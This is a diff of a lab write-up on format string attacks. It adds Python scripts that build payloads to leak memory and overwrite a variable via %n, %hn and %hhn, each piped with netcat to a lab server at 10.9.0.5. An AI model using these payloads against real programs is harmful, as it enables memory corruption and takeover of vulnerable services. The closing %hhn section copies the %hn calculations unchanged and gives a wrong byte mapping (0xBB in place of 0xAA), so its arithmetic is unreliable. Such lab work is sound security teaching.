@@ -188,7 +188,7 @@ import sys
 # Start input with a content we can easily recognize
 content = ("AAAA").encode('latin-1')
 
-# Append multiple format specifiers
+# Append format specifiers
 content += ("_%x" * 80).encode('latin-1')
 
 # Append a newline
@@ -222,7 +222,7 @@ import sys
 # Start input with the memory address of secret message
 content = (0x080b4008).to_bytes(4,byteorder='little')
 
-# Append multiple format specifiers to prevent the program from crashing
+# Append format specifiers to prevent the program from crashing
 content += ("_%x" * 63).encode('latin-1')
 
 # print out the value stored in 0x080b4008
@@ -238,6 +238,11 @@ with open('badfile', 'wb') as f:
   f.write(content)
 ```
 
+```bash
+python3 badfile.py
+cat badfile | nc -w2 10.9.0.5 9090
+```
+
 **image**
 
 <br>
@@ -249,10 +254,9 @@ We know that the memory address of the target variable is `0x080e5068`
 
 #### Changing the value to a different value.
 
-In this sub-task, we need to change the content of
-the target variable to something else. Your task is considered as a success if you can change it to a
-different value, regardless of what value it may be. The address of the target variable can be found
-from the server printout.
+This task involves changing the content of the target variable to any value different from the original. The `%n` format specifier writes the number f characters that have been printed by printf() before its occurrence into an meemory address (This memory address corresponds to the corresponding argument for %n%).
+
+Since we know that our offset is 64, will need to write our code in such a way that the program will print out characters up to offset 63, then use `%n%` at offset 64 to modify the value stored in the memory address of the target variable we provided as the start of our input.
 
 ```python
 #!/usr/bin/python3
@@ -261,10 +265,10 @@ import sys
 # Start input with the memory address of the target variable
 content = (0x080e5068).to_bytes(4,byteorder='little')
 
-# Append multiple format specifiers to prevent the program from crashing
+# Append format specifiers to prevent the program from crashing
 content += ("%x" * 63).encode('latin-1')
 
-# Access 0x080b4008 and overwrite it's content
+# Access 0x080e5068 and overwrite it's content
 content += ("%n").encode('latin-1')
 
 # Append a newline
@@ -277,45 +281,59 @@ with open('badfile', 'wb') as f:
   f.write(content)
 ```
 
+```bash
+python3 badfile.py
+cat badfile | nc -w2 10.9.0.5 9090
+```
+
 **image**
 
 #### Changing the value to 0x5000.
 
-In this sub-task, we need to change the content of the
-target variable to a specific value 0x5000. Your task is considered as a success only if the variable’s value becomes 0x5000.
+This task involves changing the content of the target variable to a "0x5000" rather than a random variable. This is more tricky than the previous task because we need to print out `0x5000 = 20480` characters. We can use precision modifiers (It pads the didgits with zeros to achieve the desired width) which control the minimum number of digits to print to achieve this. Ususally, multiple format specifiers with different precision modifiers will have to be used.
 
-**image**
+For this task, I need to determine the total number of characters I would need to print for each precision modifier.
+- 0x5000 = 20480
+- The offset is 64, and will contain multiple format specifiers:
+  - we need one for the %n% format specifier
+  - we need one for the modulo number precision modifier for %x
+  - we need 64 - 2 for the whole number precision modifier for %x
+- The first 4 bytes are where I would store the target variable's address.
+  - 20480 - 4 = 20476
+- The whole number precision modifier for %x:
+  - 20476 // 62 = 330
+- The modulo number precision modifier for %x:
+  - 20476 % 62 = 16
+ 
+To verify our math, 4 + (330 x 62) + 16 = 20480 = 0x5000
 
 ```python
 #!/usr/bin/python3
 import sys
 
-# Initialize the content array
-#N = 1500
-#content = bytearray(0x0 for i in range(N))
-
-# This line shows how to construct a string s with
-#   12 of "%.8x", concatenated with a "%n"
-#exploit = "%s"*12 + "%n"
+# Start input with the memory address of the target variable
 content = (0x080e5068).to_bytes(4,byteorder='little')
-#content = ("AAAA").encode('latin-1')
+
+# Append format specifiers to prevent the program from crashing
 content += ("%.330x" * 62).encode('latin-1')
 content += ("%.16x").encode('latin-1')
+
+# Access 0x080e5068 and overwrite it's content
 content += ("%n").encode('latin-1')
+
+# Append a newline
 content += ("\n").encode('latin-1')
-
-# The line shows how to store the string s at offset 8
-#fmt  = (s).encode('latin-1')
-#content[8:8+len(fmt)] = fmt
-
-#content = exploit.encode('latin-1')
-
 
 
 # Write the content to badfile
 with open('badfile', 'wb') as f:
   print(f"writing {len(content)} bytes to badfile...")
   f.write(content)
+```
+
+```bash
+python3 badfile.py
+cat badfile | nc -w2 10.9.0.5 9090
 ```
 
 **image**
@@ -330,6 +348,101 @@ may take hours. You need to use a faster approach. The basic idea is to use %hn 
 16
 characters does not take much time. More details can be found in the SEED book.
 
+##### Using %hn
+
+While %n treats the argument provided as a 4-byte integer, %hn treats the argument as a 2-byte integer, overwriting the least significant bytes of the argument. We are going to place `0xAABBCCDD` into memory address `0x080e5068` two bytes at a time.
+
+Our program is a 32-bit program so our address is a 4-byte address. Our machine is little-endian, so we break `0xAABBCCDD` into two parts with two bytes each.
+- 0x080e5068 => 0xCCDD
+- 0x080e506a => 0xAABB
+
+The values written are cummulative, so when constructing our string, we have to start with the addresses that will store lower values.
+
+For this task, I need to determine the total number of characters I would need to print for each precision modifier.
+- 0xAABB = 43707
+- 0xCCDD = 52445
+- The offset is 64, and will contain multiple format specifiers:
+  - we need one for the %hn% format specifier for the first address
+  - we need one for the %x modulo precision modifier for the first address
+  - we need 64 - 2 for the %x whole number precision modifier for the first address
+- The string will start with the address that will contain a lower value, appended by 4-bytes of random data to account for the %x specifier that will be used for the second address and finally the address that will contain a higher value. This is a total of 12-bytes.
+- The first address will store a lower value which is 0xAABB (43707). The first 12 bytes are where I would store the target variable's addresses.
+  - 43707 - 12 = 43695
+- The whole number %x precision modifier for the first address is:
+  - 43695 // 62 = 704
+- The modulo number %x precision modifier for the first address is:
+  - 43695 % 62 = 47
+- The second address will store a higher value which is 0xCCDD (52445). To determine the number of %x precision modifiers to use, we would subtract 0xAABB form 0xCCCC:
+  - 0xCCDD - 0xAABB = 52445 - 43707 = 8738
+
+```python
+#!/usr/bin/python3
+import sys
+
+# Start input with the memory address that will store a lower value
+content = (0x080e506a).to_bytes(4,byteorder='little')
+
+# Append 4-bytes to account for writing to the second memory address
+content += ("@@@@").encode('latin-1')
+
+# Append the memory address that will store a higher value
+content += (0x080e5068).to_bytes(4,byteorder='little')
+
+# Append format specifiers to prevent the program from crashing, access 0x080e506a and overwrite it's content
+content += ("%.704x" * 62).encode('latin-1')
+content += ("%.47x%hn").encode('latin-1')
+
+# Append format specifiers to prevent the program from crashing, access 0x080e5068 and overwrite it's content
+content += ("%.8738x%hn").encode('latin-1')
+
+# Append a newline
+content += ("\n").encode('latin-1')
+
+
+# Write the content to badfile
+with open('badfile', 'wb') as f:
+  print(f"writing {len(content)} bytes to badfile...")
+  f.write(content)
+```
+
+```bash
+python3 badfile.py
+cat badfile | nc -w2 10.9.0.5 9090
+```
+
+**image**
+
+
+##### Using %hhn
+
+While %n treats the argument provided as a 4-byte integer, %hhn treats the argument as a 1-byte integer, overwriting the least significant byte of the argument. We are going to place `0xAABBCCDD` into memory address `0x080e5068` one byte at a time.
+
+Our program is a 32-bit program so our address is a 4-byte address. Our machine is little-endian, so we break `0xAABBCCDD` into four parts with one byte each.
+- 0x080e5068 => 0xDD
+- 0x080e5069 => 0xCC
+- 0x080e506a => 0xBB
+- 0x080e506b => 0xBB
+
+The values written are cummulative, so when constructing our string, we have to start with the addresses that will store lower values.
+
+For this task, I need to determine the total number of characters I would need to print for each precision modifier.
+- 0xAA = 170
+- 0xBB = 187
+- 0xCC = 204
+- 0xDD = 221
+- The offset is 64, and will contain multiple format specifiers:
+  - we need one for the %hn% format specifier for the first address
+  - we need one for the %x modulo precision modifier for the first address
+  - we need 64 - 2 for the %x whole number precision modifier for the first address
+- The string will start with the address that will contain a lower value, appended by 4-bytes of random data to account for the %x specifier that will be used for the second address and finally the address that will contain a higher value. This is a total of 12-bytes.
+- The first address will store a lower value which is 0xAABB (43707). The first 12 bytes are where I would store the target variable's addresses.
+  - 43707 - 12 = 43695
+- The whole number %x precision modifier for the first address is:
+  - 43695 // 62 = 704
+- The modulo number %x precision modifier for the first address is:
+  - 43695 % 62 = 47
+- The second address will store a higher value which is 0xCCDD (52445). To determine the number of %x precision modifiers to use, we would subtract 0xAABB form 0xCCCC:
+  - 0xCCDD - 0xAABB = 52445 - 43707 = 8738
 
 
 
